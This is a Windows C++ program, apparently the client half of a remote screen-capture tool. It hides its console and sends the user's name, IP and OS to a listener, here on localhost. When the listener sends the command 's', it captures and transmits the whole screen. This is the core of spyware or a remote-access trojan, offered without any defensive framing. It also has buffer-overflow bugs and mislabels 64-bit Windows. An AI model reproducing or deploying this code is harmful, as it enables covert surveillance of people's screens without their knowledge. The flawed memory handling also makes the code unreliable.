#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include "Windows.h"
#include "WinSock2.h"
#include "WS2tcpip.h"
#include "thread"
#include <Lmcons.h>
#include <string>

#pragma comment (lib, "ws2_32.lib")

SOCKET connectSocket = INVALID_SOCKET;
ADDRINFO* addrResult = NULL;



const char* getOsName()
{
#ifdef _WIN32
    return "Windows 32-bit";
#elif _WIN64
    return "Windows 64-bit";
#elif __APPLE__ || __MACH__
    return "Mac OSX";
#elif __linux__
    return "Linux";
#elif __FreeBSD__
    return "FreeBSD";
#elif __unix || __unix__
    return "Unix";
#endif
}

void makeScreenShot()
{
    // Определение контекстов
    HDC ScreenDC = GetDC(0);
    HDC MemoryDC = CreateCompatibleDC(ScreenDC);

    // Фиксация размеров экрана
    int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Создание и частичное заполнение структуры формата
    BITMAPINFO BMI;
    BMI.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    BMI.bmiHeader.biWidth = ScreenWidth;
    BMI.bmiHeader.biHeight = -ScreenHeight; // Отрицательное значение высоты, чтобы изображение не было перевёрнутым
    BMI.bmiHeader.biSizeImage = ScreenWidth * ScreenHeight * 3; // Ширина * Высота * Количество_цветов_на_пиксель
    BMI.bmiHeader.biCompression = BI_RGB;
    BMI.bmiHeader.biBitCount = 24;
    BMI.bmiHeader.biPlanes = 1;
    int ScreenshotSize = BMI.bmiHeader.biSizeImage;

    unsigned char* ImageBuffer; // Указатель на блок данных BGR, управляемый HBITMAP 
    HBITMAP hBitmap = CreateDIBSection(ScreenDC, &BMI, DIB_RGB_COLORS, (void**)&ImageBuffer, 0, 0);
    SelectObject(MemoryDC, hBitmap);
    BitBlt(MemoryDC, 0, 0, ScreenWidth, ScreenHeight, ScreenDC, 0, 0, SRCCOPY);

    // Контексты больше не нужны
    DeleteDC(MemoryDC);
    ReleaseDC(NULL, ScreenDC);

    // RGB вместо BGR
    for (int i = 0; i < ScreenshotSize; i += 3) {
        unsigned char ColorValue = ImageBuffer[i];
        ImageBuffer[i] = ImageBuffer[i + 2];
        ImageBuffer[i + 2] = ColorValue;
    }

    char* screenInfo = new char[15];

    strcpy(screenInfo, std::to_string(ScreenWidth).c_str());
    strcat(screenInfo, " ");
    strcat(screenInfo, std::to_string(ScreenHeight).c_str());
    strcat(screenInfo, " ");
    std::cout << "send";
    send(connectSocket, screenInfo, 15, 0);

    send(connectSocket, (char*)ImageBuffer, 3 * ScreenHeight * ScreenWidth, 0);

    DeleteObject(hBitmap);
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {

    case CTRL_CLOSE_EVENT:
        shutdown(connectSocket, SD_SEND);
        freeaddrinfo(addrResult);
        WSACleanup();
        return TRUE;
    }
}


int main()
{
    FreeConsole();
    TCHAR wusername[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(wusername, &username_len);
    char username[UNLEN + 1];
    wcstombs(username, wusername, UNLEN + 1);


    SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);

    WSAData wsaData;
    ADDRINFO hints;

    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    char ip[INET_ADDRSTRLEN];

    if (result != 0) {
        std::cout << "StartUp failed with error " << result;
        return 1;
    }
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_family = AF_INET;

    result = getaddrinfo("localhost", "12", &hints, &addrResult);

    struct sockaddr_in* psai = (struct sockaddr_in*)addrResult->ai_addr;
    inet_ntop(addrResult->ai_family, &(psai->sin_addr), ip, INET_ADDRSTRLEN);

    connectSocket = socket(addrResult->ai_family, addrResult->ai_socktype, addrResult->ai_protocol);

    if (connectSocket == INVALID_SOCKET)
    {
        std::cout << "listen is invalid socket " << result;
        freeaddrinfo(addrResult);
        WSACleanup();
        return 1;
    }
    result = connect(connectSocket, addrResult->ai_addr, int(addrResult->ai_addrlen));
    if (result == SOCKET_ERROR)
    {
        std::cout << "connecting error " << result;
        closesocket(connectSocket);
        freeaddrinfo(addrResult);
        WSACleanup();
        return 1;
    }

    char* data = new char[strlen(username) + strlen(ip) + strlen(getOsName())];
    data = strcpy(data, username);
    data = strcat(data, "/");
    data = strcat(data, ip);
    data = strcat(data, "/");
    data = strcat(data, getOsName());
    send(connectSocket, data, strlen(data), 0);

    do {
        result = recv(connectSocket, data, strlen(data), 0);
        if (result > 0) {
            if (data[0] == 's')
                makeScreenShot();
        }
        if (result == 0)
            std::cout << "Connection closed!" << '\n';
    } while (result > 0);

    return 0;
}
